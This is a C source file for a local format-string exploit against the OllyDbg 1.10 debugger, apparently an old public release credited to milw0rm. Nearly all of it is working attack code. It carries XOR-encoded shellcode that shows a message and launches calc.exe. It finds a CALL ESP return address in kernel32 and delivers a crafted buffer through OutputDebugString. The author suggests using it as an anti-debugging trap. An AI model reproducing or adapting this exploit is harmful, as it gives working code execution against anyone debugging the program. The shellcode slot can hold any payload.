/*

..::[ jamikazu presents ]::..

OllyDbg v110 Local Format String Exploit (0day)

Author: jamikazu
Mail: jamikazu@gmail.com
web: http://jamikazu.110mb.com/

Bug discovered by Ned from (http://felinemenace.org/)

Credit: ap0x,milw0rm

Greets: All turkish security researchers ...

invokes calc.exe if successful

You can use it for your AntiCrack tricks against vuln OllyDbg

*/


#define NO_WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <stdio.h>

#define FORMAT_STRING       "%4602u"
#define XOR_DWORD           0x02020202

#ifdef __BORLANDC__
#   pragma option -w-asc
#   pragma option -w-eff
#else
#pragma comment(linker,"/ENTRY:WinMain") 
#pragma comment(lib, "msvcrt.lib") 
#endif


// shellcode xored with 0x02 ,Size : 239 by jamikazu
// First gives message than invokes calc.exe
// You can put max 256-sizeof(FORMAT_STRING)-sizeof(DWORD)/*ret*/ bytes of shellcode
// because of bounds check on user-supplied data ,see below
// char buffer[256];
// snprintf(buffer,256,user_buffer);
// buffer[255]= '\0';
char shellcode[] =
	"\xEB\x0F\x58\x80\x30\x02\x40\x81\x38\x4F\x4C\x4C\x41\x75\xF4\xEB\x05"
	"\xE8\xEC\xFF\xFF\xFF\x57\x89\xEE\x81\xEE\x0E\xEA\x02\x02\x02\x02\x5A"
	"\x2F\x91\x15\x42\x02\x8B\x47\xF6\x68\x42\x07\x48\x1A\x42\x02\x52\x89"
	"\x47\xF6\x07\xD7\x15\x42\x02\x52\x68\x02\xBA\x01\x01\x01\x01\xFD\xD2"
	"\x68\x07\x89\x47\xF6\x07\x50\x1A\x42\x02\x52\xBA\x07\x07\x07\x07\xFD"
	"\xD2\x68\x02\xBA\x06\x06\x06\x06\xFD\xD2\x89\xE7\x5F\xC1\x43\x76\x76"
	"\x63\x61\x69\x22\x6B\x71\x22\x71\x77\x61\x61\x67\x71\x71\x64\x77\x6E"
	"\x23\x08\x08\x55\x67\x22\x63\x70\x67\x22\x6B\x6C\x22\x76\x6A\x67\x22"
	"\x72\x70\x6D\x61\x67\x71\x71\x22\x61\x6D\x6C\x76\x67\x7A\x76\x22\x6D"
	"\x64\x22\x4D\x6E\x6E\x7B\x46\x60\x65\x2C\x67\x7A\x67\x08\x6C\x6D\x75"
	"\x22\x75\x67\x22\x75\x6B\x6E\x6E\x22\x6E\x63\x77\x6C\x61\x6A\x22\x61"
	"\x63\x6E\x61\x2C\x67\x7A\x67\x22\x2A\x75\x6B\x6C\x66\x6D\x75\x71\x22"
	"\x61\x63\x6E\x61\x77\x6E\x63\x76\x6D\x70\x2B\x02\x4D\x6E\x6E\x7B\x46"
	"\x60\x65\x02\x61\x63\x6E\x61\x02\x61\x63\x6E\x61\x02\x4F\x4C\x4C\x41";

DWORD SearchStream(
    const char *pvStream,
    size_t uStreamSize,
    const char *pvSubStream,
    size_t uSubStreamSize
)
{
    unsigned int uCount = 0,i,j;

    while( (uStreamSize) > (uCount) ) {
        for(i=0;i<=(uSubStreamSize-1);i++) {
            if(*pvStream != pvSubStream[i]) {
                *pvStream++;
                if( i>0 ) {
                    for(j=0;j<i;j++)
                        *pvStream--;
                }
                break;
            }
            if( i == (uSubStreamSize-1) )
                return (uCount);
            *pvStream++;
        }
        uCount++;
    }

    return -1;
}

DWORD FindRetToEspAddress(VOID)
{
    HMODULE hModule = GetModuleHandle("kernel32.dll");
    DWORD dwEspRet;
    char* pszCallEsp = "\xFF\xD4"; // CALL ESP
    //char* pszJmpEsp  = "\xFF\xE4"; // JMP ESP

    PIMAGE_DOS_HEADER pimage_dos_header;
    PIMAGE_NT_HEADERS pimage_nt_headers;

    pimage_dos_header = (PIMAGE_DOS_HEADER)hModule;
    pimage_nt_headers = (PIMAGE_NT_HEADERS)((DWORD)hModule+pimage_dos_header->e_lfanew);

    dwEspRet = SearchStream((char*)hModule,pimage_nt_headers->OptionalHeader.SizeOfImage,pszCallEsp,sizeof(WORD));

    return (dwEspRet += (DWORD)hModule);
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
    char* pszEvilBuffer;
    ULONG ulEvilBufSize;

    DWORD dw_MessageBoxA    = (DWORD)GetProcAddress(LoadLibrary("user32.dll"),"MessageBoxA")^XOR_DWORD;
    DWORD dw_WinExec        = (DWORD)GetProcAddress(GetModuleHandle("kernel32.dll"),"WinExec")^XOR_DWORD;
    DWORD dw_ExitProcess    = (DWORD)GetProcAddress(GetModuleHandle("kernel32.dll"),"ExitProcess")^XOR_DWORD;

    DWORD dwRetAddr = FindRetToEspAddress();

    int i = 0;

    memcpy(shellcode+0x3E,&dw_MessageBoxA,sizeof(DWORD));
    memcpy(shellcode+0x50,&dw_WinExec,sizeof(DWORD));
    memcpy(shellcode+0x59,&dw_ExitProcess,sizeof(DWORD));

    ulEvilBufSize = sizeof(FORMAT_STRING) + sizeof(dwRetAddr) + sizeof(shellcode);

    pszEvilBuffer = (char*)malloc(ulEvilBufSize);
    memset(pszEvilBuffer,0x90,ulEvilBufSize);

    memcpy(pszEvilBuffer+i, FORMAT_STRING, sizeof(FORMAT_STRING)-1); i += sizeof(FORMAT_STRING)-1;
    memcpy(pszEvilBuffer+i, &dwRetAddr,          sizeof(dwRetAddr)); i += sizeof(dwRetAddr);
    memcpy(pszEvilBuffer+i, shellcode,         sizeof(shellcode)-1); i += sizeof(shellcode)-1;

    // Final =)
    OutputDebugString(pszEvilBuffer);

    free(pszEvilBuffer);
    return 0;
}

